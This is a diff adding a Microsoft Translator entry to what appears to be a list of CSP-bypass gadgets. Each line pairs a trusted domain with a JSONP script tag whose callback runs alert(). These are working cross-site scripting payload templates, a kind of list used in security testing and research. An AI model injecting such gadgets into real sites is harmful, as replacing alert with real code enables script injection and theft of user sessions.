@@ -22,6 +22,7 @@ api.ipify.org	<script src="https://api.ipify.org/?format=jsonp&callback=alert(1)
 api.m.jd.com	<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=alert(document.domain)//"></script>
 api.map.baidu.com	<script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>
 api.meetup.com	<script src="https://api.meetup.com/Toronto-Code-Mentoring/events?callback=alert"></script>
+api.microsofttranslator.com	<script src="https://api.microsofttranslator.com/V2/Ajax.svc/GetLanguagesForTranslate?oncomplete=alert&appId=417CEAD93449502CC3C9B69FED26C54118E62BCC"></script>
 api.mixpanel.com	<script src="https://api.mixpanel.com/track/?callback=alert(1337)"></script>
 api.olark.com	<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih018BZ0P04rBy00W3?_callback=alert&_method=PUT"></script>
 api.pinterest.com	<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>
